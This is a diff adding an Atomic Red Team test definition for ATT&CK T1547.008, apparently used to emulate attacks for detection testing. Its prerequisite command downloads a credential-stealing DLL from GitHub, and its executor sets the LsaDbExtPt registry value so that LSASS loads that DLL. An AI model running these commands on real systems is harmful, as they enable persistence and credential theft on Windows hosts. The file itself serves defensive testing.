@@ -1,0 +1,34 @@
+attack_technique: T1547.008
+display_name: 'Boot or Logon Autostart Execution: LSASS Driver'
+atomic_tests:
+- name: Modify Registry to load Arbitrary DLL into LSASS - LsaDbExtPt
+  auto_generated_guid: 8ecef16d-d289-46b4-917b-0dba6dc81cf1
+  description: |
+    The following Atomic will modify an undocumented registry key that may be abused to load a arbitrary DLL into LSASS. 
+    
+    Upon execution, the registry key will be modified and a value will contain the path to the DLL. 
+    Reference: https://blog.xpnsec.com/exploring-mimikatz-part-1/ and source https://github.com/oxfemale/LogonCredentialsSteal
+    Note that if any LSA based protection is enabled, this will most likely not be successful with LSASS.exe loading the DLL.
+  supported_platforms:
+  - windows
+  input_arguments:
+    dll_path:
+      description: Module to be loaded into LSASS
+      type: Path
+      default: '$env:TEMP\lsass_lib.dll'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      lsass_lib.dll must exist on disk at specified location (#{dll_path})
+    prereq_command: |
+      if (Test-Path #{dll_path}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest "https://github.com/oxfemale/LogonCredentialsSteal/raw/53e74251f397ddeab2bd1348c3ff26d702cfd836/lsass_lib/x64/Release/lsass_lib.dll" -UseBasicParsing -OutFile "#{dll_path}"
+  executor:
+    command: |
+      New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value "#{dll_path}"
+    cleanup_command: |
+      Remove-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NTDS" -Name "LsaDbExtPt" -ErrorAction Ignore | Out-Null
+    name: powershell
+    elevation_required: true
